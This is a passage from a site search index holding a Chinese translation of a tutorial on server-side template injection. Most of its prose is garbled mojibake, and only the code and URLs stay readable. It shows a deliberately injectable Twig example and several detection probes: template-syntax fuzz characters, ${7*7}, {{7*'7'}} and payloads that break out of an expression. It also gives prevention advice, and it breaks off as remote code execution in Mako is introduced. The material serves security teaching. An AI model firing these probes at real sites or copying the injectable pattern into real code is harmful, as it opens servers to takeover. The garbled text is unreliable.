injection","uri":"/translation/web-security/server-side-template-injection/server-side-template-injection/"},{"categories":["web security"],"content":"Server-side template injection åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†ä»‹ç»ä»€ä¹ˆæ˜¯æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ï¼Œå¹¶æ¦‚è¿°åˆ©ç”¨æ­¤æ¼æ´çš„åŸºæœ¬æ–¹æ³•ï¼ŒåŒæ—¶ä¹Ÿå°†æä¾›ä¸€äº›é¿å…æ­¤æ¼æ´çš„å»ºè®®ã€‚ ","date":"2021-03-10","objectID":"/translation/web-security/server-side-template-injection/server-side-template-injection/:0:0","tags":[],"title":"web å®‰å…¨ä¹‹ Server-side template injection","uri":"/translation/web-security/server-side-template-injection/server-side-template-injection/"},{"categories":["web security"],"content":"ä»€ä¹ˆæ˜¯æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ˜¯æŒ‡æ”»å‡»è€…èƒ½å¤Ÿåˆ©ç”¨æ¨¡æ¿è‡ªèº«è¯­æ³•å°†æ¶æ„è´Ÿè½½æ³¨å…¥æ¨¡æ¿ï¼Œç„¶ååœ¨æœåŠ¡ç«¯æ‰§è¡Œã€‚ æ¨¡æ¿å¼•æ“è¢«è®¾è®¡æˆé€šè¿‡ç»“åˆå›ºå®šæ¨¡æ¿å’Œå¯å˜æ•°æ®æ¥ç”Ÿæˆç½‘é¡µã€‚å½“ç”¨æˆ·è¾“å…¥ç›´æ¥æ‹¼æ¥åˆ°æ¨¡æ¿ä¸­ï¼Œè€Œä¸æ˜¯ä½œä¸ºæ•°æ®ä¼ å…¥æ—¶ï¼Œå¯èƒ½ä¼šå‘ç”ŸæœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ”»å‡»ã€‚è¿™ä½¿å¾—æ”»å‡»è€…èƒ½å¤Ÿæ³¨å…¥ä»»æ„æ¨¡æ¿æŒ‡ä»¤æ¥æ“çºµæ¨¡æ¿å¼•æ“ï¼Œä»è€Œèƒ½å¤Ÿå®Œå…¨æ§åˆ¶æœåŠ¡å™¨ã€‚é¡¾åæ€ä¹‰ï¼ŒæœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æœ‰æ•ˆè´Ÿè½½æ˜¯åœ¨æœåŠ¡ç«¯äº¤ä»˜å’Œæ‰§è¡Œçš„ï¼Œè¿™å¯èƒ½ä½¿å®ƒä»¬æ¯”å…¸å‹çš„å®¢æˆ·ç«¯æ¨¡æ¿æ³¨å…¥æ›´å±é™©ã€‚ ","date":"2021-03-10","objectID":"/translation/web-security/server-side-template-injection/server-side-template-injection/:1:0","tags":[],"title":"web å®‰å…¨ä¹‹ Server-side template injection","uri":"/translation/web-security/server-side-template-injection/server-side-template-injection/"},{"categories":["web security"],"content":"æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ä¼šé€ æˆä»€ä¹ˆå½±å“ æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´ä¼šä½¿ç½‘ç«™é¢ä¸´å„ç§æ”»å‡»ï¼Œå…·ä½“å–å†³äºæ‰€è®¨è®ºçš„æ¨¡æ¿å¼•æ“ä»¥åŠåº”ç”¨ç¨‹åºå¦‚ä½•ä½¿ç”¨å®ƒã€‚åœ¨æå°‘æ•°æƒ…å†µä¸‹ï¼Œè¿™äº›æ¼æ´ä¸ä¼šå¸¦æ¥çœŸæ­£çš„å®‰å…¨é£é™©ã€‚ç„¶è€Œï¼Œå¤§å¤šæ•°æƒ…å†µä¸‹ï¼ŒæœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥çš„å½±å“å¯èƒ½æ˜¯ç¾éš¾æ€§çš„ã€‚ æœ€ä¸¥é‡çš„æƒ…å†µæ˜¯ï¼Œæ”»å‡»è€…æœ‰å¯èƒ½å®Œæˆè¿œç¨‹ä»£ç æ‰§è¡Œï¼Œä»è€Œå®Œå…¨æ§åˆ¶åç«¯æœåŠ¡å™¨ï¼Œå¹¶åˆ©ç”¨å®ƒå¯¹å†…éƒ¨åŸºç¡€è®¾æ–½è¿›è¡Œå…¶ä»–æ”»å‡»ã€‚ å³ä½¿åœ¨ä¸å¯èƒ½å®Œå…¨æ‰§è¡Œè¿œç¨‹ä»£ç çš„æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…é€šå¸¸ä»å¯ä»¥ä½¿ç”¨æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ä½œä¸ºè®¸å¤šå…¶ä»–æ”»å‡»çš„åŸºç¡€ï¼Œä»è€Œå¯èƒ½è·å¾—æœåŠ¡å™¨ä¸Šæ•æ„Ÿæ•°æ®å’Œä»»æ„æ–‡ä»¶çš„è®¿é—®æƒé™ã€‚ ","date":"2021-03-10","objectID":"/translation/web-security/server-side-template-injection/server-side-template-injection/:2:0","tags":[],"title":"web å®‰å…¨ä¹‹ Server-side template injection","uri":"/translation/web-security/server-side-template-injection/server-side-template-injection/"},{"categories":["web security"],"content":"æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´æ˜¯å¦‚ä½•äº§ç”Ÿçš„ å½“ç”¨æˆ·è¾“å…¥ç›´æ¥æ‹¼æ¥åˆ°æ¨¡æ¿ä¸­è€Œä¸æ˜¯ä½œä¸ºæ•°æ®ä¼ å…¥æ—¶ï¼Œå°±ä¼šå‡ºç°æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´ã€‚ ç®€å•åœ°æä¾›å ä½ç¬¦å¹¶åœ¨å…¶ä¸­å‘ˆç°åŠ¨æ€å†…å®¹çš„é™æ€æ¨¡æ¿é€šå¸¸ä¸ä¼šå—åˆ°æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥çš„æ”»å‡»ã€‚å…¸å‹çš„ä¾‹å­å¦‚æå–ç”¨æˆ·åä½œä¸ºç”µå­é‚®ä»¶çš„å¼€å¤´ï¼Œä¾‹å¦‚ä»¥ä¸‹ä» Twig æ¨¡æ¿ä¸­æå–çš„å†…å®¹ï¼š $output = $twig-\u003erender(\"Dear {first_name},\", array(\"first_name\" =\u003e $user.first_name) ); è¿™ä¸å®¹æ˜“å—åˆ°æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥çš„æ”»å‡»ï¼Œå› ä¸ºç”¨æˆ·çš„åå­—åªæ˜¯ä½œä¸ºæ•°æ®ä¼ é€’åˆ°æ¨¡æ¿ä¸­çš„ã€‚ ä½†æ˜¯ï¼ŒWeb å¼€å‘äººå‘˜æœ‰æ—¶å¯èƒ½å°†ç”¨æˆ·è¾“å…¥ç›´æ¥è¿æ¥åˆ°æ¨¡æ¿ä¸­ï¼Œå¦‚ï¼š $output = $twig-\u003erender(\"Dear \" . $_GET['name']); æ­¤æ—¶ï¼Œä¸æ˜¯å°†é™æ€å€¼ä¼ é€’åˆ°æ¨¡æ¿ä¸­ï¼Œè€Œæ˜¯ä½¿ç”¨ GET name åŠ¨æ€ç”Ÿæˆæ¨¡æ¿æœ¬èº«çš„ä¸€éƒ¨åˆ†ã€‚ç”±äºæ¨¡æ¿è¯­æ³•æ˜¯åœ¨æœåŠ¡ç«¯æ‰§è¡Œçš„ï¼Œè¿™å¯èƒ½å…è®¸æ”»å‡»è€…ä½¿ç”¨ name å‚æ•°å¦‚ä¸‹ï¼š http://vulnerable-website.com/?name={{bad-stuff-here}} åƒè¿™æ ·çš„æ¼æ´æœ‰æ—¶æ˜¯ç”±äºä¸ç†Ÿæ‚‰å®‰å…¨æ¦‚å¿µçš„äººè®¾è®¡äº†æœ‰ç¼ºé™·çš„æ¨¡æ¿é€ æˆçš„ã€‚ä¸ä¸Šé¢çš„ä¾‹å­ä¸€æ ·ï¼Œä½ å¯èƒ½ä¼šçœ‹åˆ°ä¸åŒçš„ç»„ä»¶ï¼Œå…¶ä¸­ä¸€äº›ç»„ä»¶åŒ…å«ç”¨æˆ·è¾“å…¥ï¼Œè¿æ¥å¹¶åµŒå…¥åˆ°æ¨¡æ¿ä¸­ã€‚åœ¨æŸäº›æ–¹é¢ï¼Œè¿™ç±»ä¼¼äº SQL æ³¨å…¥æ¼æ´ï¼Œéƒ½æ˜¯ç¼–å†™äº†ä¸å½“çš„è¯­å¥ã€‚ ç„¶è€Œï¼Œæœ‰æ—¶è¿™ç§è¡Œä¸ºå®é™…ä¸Šæ˜¯æœ‰æ„ä¸ºä¹‹ã€‚ä¾‹å¦‚ï¼Œæœ‰äº›ç½‘ç«™æ•…æ„å…è®¸æŸäº›ç‰¹æƒç”¨æˆ·ï¼ˆå¦‚å†…å®¹ç¼–è¾‘å™¨ï¼‰é€šè¿‡è®¾è®¡æ¥ç¼–è¾‘æˆ–æäº¤è‡ªå®šä¹‰æ¨¡æ¿ã€‚å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿåˆ©ç”¨ç‰¹æƒå¸æˆ·ï¼Œè¿™æ˜¾ç„¶ä¼šå¸¦æ¥å·¨å¤§çš„å®‰å…¨é£é™©ã€‚ ","date":"2021-03-10","objectID":"/translation/web-security/server-side-template-injection/server-side-template-injection/:3:0","tags":[],"title":"web å®‰å…¨ä¹‹ Server-side template injection","uri":"/translation/web-security/server-side-template-injection/server-side-template-injection/"},{"categories":["web security"],"content":"æ„é€ æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ”»å‡» è¯†åˆ«æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´å¹¶ç­–åˆ’æˆåŠŸçš„æ”»å‡»é€šå¸¸æ¶‰åŠä»¥ä¸‹æŠ½è±¡è¿‡ç¨‹ã€‚ ","date":"2021-03-10","objectID":"/translation/web-security/server-side-template-injection/server-side-template-injection/:4:0","tags":[],"title":"web å®‰å…¨ä¹‹ Server-side template injection","uri":"/translation/web-security/server-side-template-injection/server-side-template-injection/"},{"categories":["web security"],"content":"æ¢æµ‹ æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´å¸¸å¸¸ä¸è¢«æ³¨æ„åˆ°ï¼Œè¿™ä¸æ˜¯å› ä¸ºå®ƒä»¬å¾ˆå¤æ‚ï¼Œè€Œæ˜¯å› ä¸ºå®ƒä»¬åªæœ‰åœ¨æ˜ç¡®å¯»æ‰¾å®ƒä»¬çš„å®¡è®¡äººå‘˜é¢å‰æ‰çœŸæ­£æ˜æ˜¾ã€‚å¦‚æœä½ èƒ½å¤Ÿæ£€æµ‹åˆ°å­˜åœ¨æ¼æ´ï¼Œåˆ™åˆ©ç”¨å®ƒå°†éå¸¸å®¹æ˜“ã€‚åœ¨éæ²™ç›’ç¯å¢ƒä¸­å°¤å…¶å¦‚æ­¤ã€‚ ä¸ä»»ä½•æ¼æ´ä¸€æ ·ï¼Œåˆ©ç”¨æ¼æ´çš„ç¬¬ä¸€æ­¥å°±æ˜¯å…ˆæ‰¾åˆ°å®ƒã€‚ä¹Ÿè®¸æœ€ç®€å•çš„åˆå§‹æ–¹æ³•å°±æ˜¯æ³¨å…¥æ¨¡æ¿è¡¨è¾¾å¼ä¸­å¸¸ç”¨çš„ä¸€ç³»åˆ—ç‰¹æ®Šå­—ç¬¦ï¼Œä¾‹å¦‚ ${{\u003c%[%â€™\"}}%\\ ï¼Œå»å°è¯•æ¨¡ç³ŠåŒ–æ¨¡æ¿ã€‚å¦‚æœå¼•å‘å¼‚å¸¸ï¼Œåˆ™è¡¨æ˜æœåŠ¡å™¨å¯èƒ½ä»¥æŸç§æ–¹å¼è§£é‡Šäº†æ³¨å…¥çš„æ¨¡æ¿è¯­æ³•ï¼Œä»è€Œè¡¨æ˜æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥å¯èƒ½å­˜åœ¨æ¼æ´ã€‚ æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´å‘ç”Ÿåœ¨ä¸¤ä¸ªä¸åŒçš„ä¸Šä¸‹æ–‡ä¸­ï¼Œæ¯ä¸ªä¸Šä¸‹æ–‡éƒ½éœ€è¦è‡ªå·±çš„æ£€æµ‹æ–¹æ³•ã€‚ä¸ç®¡æ¨¡ç³ŠåŒ–å°è¯•çš„ç»“æœå¦‚ä½•ï¼Œä¹Ÿè¦å°è¯•ä»¥ä¸‹ç‰¹å®šäºä¸Šä¸‹æ–‡çš„æ–¹æ³•ã€‚å¦‚æœæ¨¡ç³ŠåŒ–æ˜¯ä¸ç¡®å®šçš„ï¼Œé‚£ä¹ˆä½¿ç”¨è¿™äº›æ–¹æ³•ä¹‹ä¸€ï¼Œæ¼æ´å¯èƒ½ä¼šæš´éœ²å‡ºæ¥ã€‚å³ä½¿æ¨¡ç³ŠåŒ–ç¡®å®è¡¨æ˜å­˜åœ¨æ¨¡æ¿æ³¨å…¥æ¼æ´ï¼Œä½ ä»ç„¶éœ€è¦ç¡®å®šå…¶ä¸Šä¸‹æ–‡æ‰èƒ½åˆ©ç”¨å®ƒã€‚ Plaintext context çº¯æ–‡æœ¬ä¸Šä¸‹æ–‡ã€‚ å¤§å¤šæ•°æ¨¡æ¿è¯­è¨€å…è®¸ä½ é€šè¿‡ç›´æ¥ä½¿ç”¨ HTML tags æˆ–æ¨¡æ¿è¯­æ³•è‡ªç”±åœ°è¾“å…¥å†…å®¹ï¼Œåç«¯åœ¨å‘é€ HTTP å“åº”ä¹‹å‰ï¼Œä¼šæŠŠè¿™äº›å†…å®¹æ¸²æŸ“ä¸º HTML ã€‚ä¾‹å¦‚ï¼Œåœ¨ Freemarker æ¨¡æ¿ä¸­ï¼Œrender('Hello ' + username) å¯èƒ½ä¼šæ¸²æŸ“ä¸º Hello Carlos ã€‚ è¿™æœ‰æ—¶ç»å¸¸è¢«è¯¯è®¤ä¸ºæ˜¯ä¸€ä¸ªç®€å•çš„ XSS æ¼æ´å¹¶ç”¨äº XSS æ”»å‡»ã€‚ä½†æ˜¯ï¼Œé€šè¿‡å°†æ•°å­¦è¿ç®—è®¾ç½®ä¸ºå‚æ•°çš„å€¼ï¼Œæˆ‘ä»¬å¯ä»¥æµ‹è¯•å…¶æ˜¯å¦ä¹Ÿæ˜¯æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ”»å‡»çš„æ½œåœ¨æ”»å‡»ç‚¹ã€‚ ä¾‹å¦‚ï¼Œè€ƒè™‘åŒ…å«ä»¥ä¸‹æ¨¡æ¿ä»£ç ï¼š render('Hello ' + username) åœ¨å®¡æŸ¥è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¯·æ±‚ä»¥ä¸‹ URL æ¥æµ‹è¯•æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ï¼š http://vulnerable-website.com/?username=${7*7} å¦‚æœç»“æœè¾“å‡ºåŒ…å« Hello 49 ï¼Œè¿™è¡¨æ˜æ•°å­¦è¿ç®—è¢«æœåŠ¡ç«¯æ‰§è¡Œäº†ã€‚è¿™æ˜¯æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´çš„ä¸€ä¸ªå¾ˆå¥½çš„è¯æ˜ã€‚ è¯·æ³¨æ„ï¼ŒæˆåŠŸè®¡ç®—æ•°å­¦è¿ç®—æ‰€éœ€çš„ç‰¹å®šè¯­æ³•å°†å› ä½¿ç”¨çš„æ¨¡æ¿å¼•æ“è€Œå¼‚ã€‚æˆ‘ä»¬å°†åœ¨ Identify æ­¥éª¤è¯¦ç»†è¯´æ˜ã€‚ Code context ä»£ç ä¸Šä¸‹æ–‡ã€‚ åœ¨å…¶ä»–æƒ…å†µä¸‹ï¼Œæ¼æ´æš´éœ²æ˜¯å› ä¸ºå°†ç”¨æˆ·è¾“å…¥æ”¾åœ¨äº†æ¨¡æ¿è¡¨è¾¾å¼ä¸­ï¼Œå°±åƒä¸Šæ–‡ä¸­çš„ç”µå­é‚®ä»¶ç¤ºä¾‹ä¸­çœ‹åˆ°çš„é‚£æ ·ã€‚è¿™å¯ä»¥é‡‡ç”¨å°†ç”¨æˆ·å¯æ§åˆ¶çš„å˜é‡åæ”¾ç½®åœ¨å‚æ•°ä¸­çš„å½¢å¼ï¼Œä¾‹å¦‚ï¼š greeting = getQueryParameter('greeting') engine.render(\"Hello {{\"+greeting+\"}}\", data) åœ¨ç½‘ç«™ä¸Šç”Ÿæˆçš„ URL ç±»ä¼¼äºï¼š http://vulnerable-website.com/?greeting=data.username æ¸²æŸ“çš„è¾“å‡ºå¯èƒ½ä¸º Hello Carlos ã€‚ åœ¨è¯„ä¼°è¿‡ç¨‹ä¸­å¾ˆå®¹æ˜“å¿½ç•¥è¿™ä¸ªä¸Šä¸‹æ–‡ï¼Œå› ä¸ºå®ƒä¸ä¼šäº§ç”Ÿæ˜æ˜¾çš„ XSSï¼Œå¹¶ä¸”ä¸ç®€å•çš„ hashmap æŸ¥æ‰¾å‡ ä¹æ²¡æœ‰åŒºåˆ«ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæµ‹è¯•æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥çš„ä¸€ç§æ–¹æ³•æ˜¯é¦–å…ˆé€šè¿‡å‘å€¼ä¸­æ³¨å…¥ä»»æ„ HTML æ¥ç¡®å®šå‚æ•°ä¸åŒ…å«ç›´æ¥çš„ XSS æ¼æ´ï¼š http://vulnerable-website.com/?greeting=data.username\u003ctag\u003e åœ¨æ²¡æœ‰ XSS çš„æƒ…å†µä¸‹ï¼Œè¿™é€šå¸¸ä¼šå¯¼è‡´è¾“å‡ºä¸­å‡ºç°ç©ºç™½ï¼ˆåªæœ‰ Helloï¼Œæ²¡æœ‰ username ï¼‰ï¼Œç¼–ç æ ‡ç­¾æˆ–é”™è¯¯ä¿¡æ¯ã€‚ä¸‹ä¸€æ­¥æ˜¯å°è¯•ä½¿ç”¨é€šç”¨æ¨¡æ¿è¯­æ³•æ¥è·³å‡ºè¯¥è¯­å¥ï¼Œå¹¶å°è¯•åœ¨å…¶åæ³¨å…¥ä»»æ„ HTML ï¼š http://vulnerable-website.com/?greeting=data.username}}\u003ctag\u003e å¦‚æœè¿™å†æ¬¡å¯¼è‡´é”™è¯¯æˆ–ç©ºç™½è¾“å‡ºï¼Œåˆ™è¯´æ˜ä½ ä½¿ç”¨äº†é”™è¯¯çš„æ¨¡æ¿è¯­æ³•ã€‚æˆ–è€…ï¼Œæ¨¡æ¿æ ·å¼çš„è¯­æ³•å‡æ— æ•ˆï¼Œæ­¤æ—¶åˆ™æ— æ³•è¿›è¡ŒæœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ã€‚å¦‚æœè¾“å‡ºä¸ä»»æ„ HTML ä¸€èµ·æ­£ç¡®å‘ˆç°ï¼Œåˆ™è¿™æ˜¯æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´å­˜åœ¨çš„å…³é”®è¯æ˜ï¼š Hello Carlos\u003ctag\u003e ","date":"2021-03-10","objectID":"/translation/web-security/server-side-template-injection/server-side-template-injection/:4:1","tags":[],"title":"web å®‰å…¨ä¹‹ Server-side template injection","uri":"/translation/web-security/server-side-template-injection/server-side-template-injection/"},{"categories":["web security"],"content":"è¯†åˆ« ä¸€æ—¦æ£€æµ‹åˆ°æ½œåœ¨çš„æ¨¡æ¿æ³¨å…¥ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯ç¡®å®šæ¨¡æ¿å¼•æ“ã€‚ å°½ç®¡æœ‰å¤§é‡çš„æ¨¡æ¿è¯­è¨€ï¼Œä½†è®¸å¤šéƒ½ä½¿ç”¨éå¸¸ç›¸ä¼¼çš„è¯­æ³•ï¼Œè¿™äº›è¯­æ³•æ˜¯ä¸“é—¨ä¸ºé¿å…ä¸ HTML å­—ç¬¦å†²çªè€Œé€‰æ‹©çš„ã€‚å› æ­¤ï¼Œæ„é€ è¯•æ¢æ€§è½½è·æ¥æµ‹è¯•æ­£åœ¨ä½¿ç”¨å“ªä¸ªæ¨¡æ¿å¼•æ“å¯èƒ½ç›¸å¯¹ç®€å•ã€‚ ç®€å•åœ°æäº¤æ— æ•ˆçš„è¯­æ³•å°±è¶³å¤Ÿäº†ï¼Œå› ä¸ºç”Ÿæˆçš„é”™è¯¯æ¶ˆæ¯ä¼šå‘Šè¯‰ä½ ç”¨äº†å“ªä¸ªæ¨¡æ¿å¼•æ“ï¼Œæœ‰æ—¶ç”šè‡³èƒ½å…·ä½“åˆ°å“ªä¸ªç‰ˆæœ¬ã€‚ä¾‹å¦‚ï¼Œéæ³•çš„è¡¨è¾¾å¼ \u003c%=foobar%\u003e è§¦å‘äº†åŸºäº Ruby çš„ ERB å¼•æ“çš„å¦‚ä¸‹å“åº”ï¼š (erb):1:in `\u003cmain\u003e': undefined local variable or method `foobar' for main:Object (NameError) from /usr/lib/ruby/2.5.0/erb.rb:876:in `eval' from /usr/lib/ruby/2.5.0/erb.rb:876:in `result' from -e:4:in `\u003cmain\u003e' å¦åˆ™ï¼Œä½ å°†éœ€è¦æ‰‹åŠ¨æµ‹è¯•ä¸åŒè¯­è¨€ç‰¹å®šçš„æœ‰æ•ˆè´Ÿè½½ï¼Œå¹¶ç ”ç©¶æ¨¡æ¿å¼•æ“å¦‚ä½•è§£é‡Šå®ƒä»¬ã€‚ä½¿ç”¨åŸºäºè¯­æ³•æœ‰æ•ˆæˆ–æ— æ•ˆçš„æ’é™¤è¿‡ç¨‹ï¼Œä½ å¯ä»¥æ¯”ä½ æƒ³è±¡çš„æ›´å¿«åœ°ç¼©å°é€‰é¡¹èŒƒå›´ã€‚ä¸€ç§å¸¸è§çš„æ–¹æ³•æ˜¯ä½¿ç”¨æ¥è‡ªä¸åŒæ¨¡æ¿å¼•æ“çš„è¯­æ³•æ³¨å…¥ä»»æ„çš„æ•°å­¦è¿ç®—ã€‚ç„¶åï¼Œè§‚å¯Ÿå®ƒä»¬æ˜¯å¦è¢«æˆåŠŸæ‰§è¡Œã€‚è¦å®Œæˆæ­¤è¿‡ç¨‹ï¼Œå¯ä»¥ä½¿ç”¨ç±»ä¼¼äºä»¥ä¸‹å†…å®¹çš„å†³ç­–æ ‘ï¼š ä½ åº”è¯¥æ³¨æ„ï¼ŒåŒæ ·çš„æœ‰æ•ˆè´Ÿè½½æœ‰æ—¶å¯ä»¥è·å¾—å¤šä¸ªæ¨¡æ¿è¯­è¨€çš„æˆåŠŸå“åº”ã€‚ä¾‹å¦‚ï¼Œæœ‰æ•ˆè½½è· {{7*'7'}} åœ¨ Twig ä¸­è¿”å› 49 ï¼Œåœ¨ Jinja2 ä¸­è¿”å› 7777777 ã€‚å› æ­¤ï¼Œä¸è¦åªå› ä¸ºæˆåŠŸå“åº”äº†å°±è‰ç‡ä¸‹ç»“è®ºã€‚ ","date":"2021-03-10","objectID":"/translation/web-security/server-side-template-injection/server-side-template-injection/:4:2","tags":[],"title":"web å®‰å…¨ä¹‹ Server-side template injection","uri":"/translation/web-security/server-side-template-injection/server-side-template-injection/"},{"categories":["web security"],"content":"åˆ©ç”¨ åœ¨æ£€æµ‹åˆ°å­˜åœ¨æ½œåœ¨æ¼æ´å¹¶æˆåŠŸè¯†åˆ«æ¨¡æ¿å¼•æ“ä¹‹åï¼Œå°±å¯ä»¥å¼€å§‹å°è¯•å¯»æ‰¾åˆ©ç”¨å®ƒçš„æ–¹æ³•ã€‚è¯¦ç»†è¯·ç¿»é˜…ä¸‹æ–‡ã€‚ ","date":"2021-03-10","objectID":"/translation/web-security/server-side-template-injection/server-side-template-injection/:4:3","tags":[],"title":"web å®‰å…¨ä¹‹ Server-side template injection","uri":"/translation/web-security/server-side-template-injection/server-side-template-injection/"},{"categories":["web security"],"content":"å¦‚ä½•é˜²æ­¢æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´ é˜²æ­¢æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥çš„æœ€ä½³æ–¹æ³•æ˜¯ä¸å…è®¸ä»»ä½•ç”¨æˆ·ä¿®æ”¹æˆ–æäº¤æ–°æ¨¡æ¿ã€‚ç„¶è€Œï¼Œç”±äºä¸šåŠ¡éœ€æ±‚ï¼Œè¿™æœ‰æ—¶æ˜¯ä¸å¯é¿å…çš„ã€‚ é¿å…å¼•å…¥æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´çš„æœ€ç®€å•æ–¹æ³•ä¹‹ä¸€æ˜¯ï¼Œé™¤éç»å¯¹å¿…è¦ï¼Œå§‹ç»ˆä½¿ç”¨â€œæ— é€»è¾‘â€æ¨¡æ¿å¼•æ“ï¼Œå¦‚ Mustacheã€‚å°½å¯èƒ½çš„å°†é€»è¾‘ä¸è¡¨ç¤ºåˆ†ç¦»ï¼Œè¿™å¯ä»¥å¤§å¤§å‡å°‘é«˜å±é™©æ€§çš„åŸºäºæ¨¡æ¿çš„æ”»å‡»çš„é£é™©ã€‚ å¦ä¸€æªæ–½æ˜¯ä»…åœ¨å®Œå…¨åˆ é™¤äº†æ½œåœ¨å±é™©æ¨¡å—å’ŒåŠŸèƒ½çš„æ²™ç›’ç¯å¢ƒä¸­æ‰§è¡Œç”¨æˆ·çš„ä»£ç ã€‚ä¸å¹¸çš„æ˜¯ï¼Œå¯¹ä¸å¯ä¿¡çš„ä»£ç è¿›è¡Œæ²™ç›’å¤„ç†æœ¬èº«å°±å¾ˆå›°éš¾ï¼Œè€Œä¸”å®¹æ˜“è¢«ç»•è¿‡ã€‚ æœ€åï¼Œå¯¹äºæ¥å—ä»»æ„ä»£ç æ‰§è¡Œæ— æ³•é¿å…çš„æƒ…å†µï¼Œå¦ä¸€ç§è¡¥å……æ–¹æ³•æ˜¯ï¼Œé€šè¿‡åœ¨é”å®šçš„ä¾‹å¦‚ Docker å®¹å™¨ä¸­éƒ¨ç½²æ¨¡æ¿ç¯å¢ƒï¼Œæ¥åº”ç”¨ä½ è‡ªå·±çš„æ²™ç›’ã€‚ ","date":"2021-03-10","objectID":"/translation/web-security/server-side-template-injection/server-side-template-injection/:5:0","tags":[],"title":"web å®‰å…¨ä¹‹ Server-side template injection","uri":"/translation/web-security/server-side-template-injection/server-side-template-injection/"},{"categories":["web security"],"content":"Exploiting server-side template injection vulnerabilities","date":"2021-03-10","objectID":"/translation/web-security/server-side-template-injection/exploiting-server-side-template-injection-vulnerabilities/","tags":[],"title":"Exploiting server-side template injection vulnerabilities","uri":"/translation/web-security/server-side-template-injection/exploiting-server-side-template-injection-vulnerabilities/"},{"categories":["web security"],"content":"åˆ©ç”¨æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´ åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†æ›´ä»”ç»†åœ°äº†è§£ä¸€äº›å…¸å‹çš„æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´ï¼Œå¹¶æ¼”ç¤ºå¦‚ä½•åˆ©ç”¨ä¹‹å‰å½’çº³çš„æ–¹æ³•ã€‚é€šè¿‡ä»˜è¯¸å®è·µï¼Œä½ å¯ä»¥æ½œåœ¨åœ°å‘ç°å’Œåˆ©ç”¨å„ç§ä¸åŒçš„æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´ã€‚ ä¸€æ—¦å‘ç°æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´ï¼Œå¹¶ç¡®å®šæ­£åœ¨ä½¿ç”¨çš„æ¨¡æ¿å¼•æ“ï¼ŒæˆåŠŸåˆ©ç”¨è¯¥æ¼æ´é€šå¸¸æ¶‰åŠä»¥ä¸‹è¿‡ç¨‹ã€‚ é˜…è¯» æ¨¡æ¿è¯­æ³• å®‰å…¨æ–‡æ¡£ å·²çŸ¥çš„æ¼æ´åˆ©ç”¨ æ¢ç´¢ç¯å¢ƒ æ„é€ è‡ªå®šä¹‰æ”»å‡» ","date":"2021-03-10","objectID":"/translation/web-security/server-side-template-injection/exploiting-server-side-template-injection-vulnerabilities/:0:0","tags":[],"title":"Exploiting server-side template injection vulnerabilities","uri":"/translation/web-security/server-side-template-injection/exploiting-server-side-template-injection-vulnerabilities/"},{"categories":["web security"],"content":"é˜…è¯» é™¤éä½ å·²ç»å¯¹æ¨¡æ¿å¼•æ“äº†å¦‚æŒ‡æŒï¼Œå¦åˆ™åº”è¯¥å…ˆé˜…è¯»å…¶æ–‡æ¡£ã€‚è™½ç„¶è¿™å¯èƒ½æœ‰ç‚¹æ— èŠï¼Œä½†æ˜¯ä¸è¦ä½ä¼°æ–‡æ¡£å¯èƒ½æ˜¯æœ‰ç”¨çš„ä¿¡æ¯æ¥æºã€‚ ","date":"2021-03-10","objectID":"/translation/web-security/server-side-template-injection/exploiting-server-side-template-injection-vulnerabilities/:1:0","tags":[],"title":"Exploiting server-side template injection vulnerabilities","uri":"/translation/web-security/server-side-template-injection/exploiting-server-side-template-injection-vulnerabilities/"},{"categories":["web security"],"content":"å­¦ä¹ åŸºæœ¬æ¨¡æ¿è¯­æ³• å­¦ä¹ åŸºæœ¬è¯­æ³•ã€å…³é”®å‡½æ•°å’Œå˜é‡å¤„ç†æ˜¾ç„¶å¾ˆé‡è¦ã€‚å³ä½¿åªæ˜¯ç®€å•åœ°å­¦ä¹ å¦‚ä½•åœ¨æ¨¡æ¿ä¸­åµŒå…¥æœ¬æœºä»£ç å—ï¼Œæœ‰æ—¶ä¹Ÿä¼šå¾ˆå¿«å¯¼è‡´æ¼æ´åˆ©ç”¨ã€‚ä¾‹å¦‚ï¼Œä¸€æ—¦ä½ çŸ¥é“æ­£åœ¨ä½¿ç”¨åŸºäº Python çš„ Mako æ¨¡æ¿å¼•æ“ï¼Œå®ç°è¿œç¨‹ä»£ç 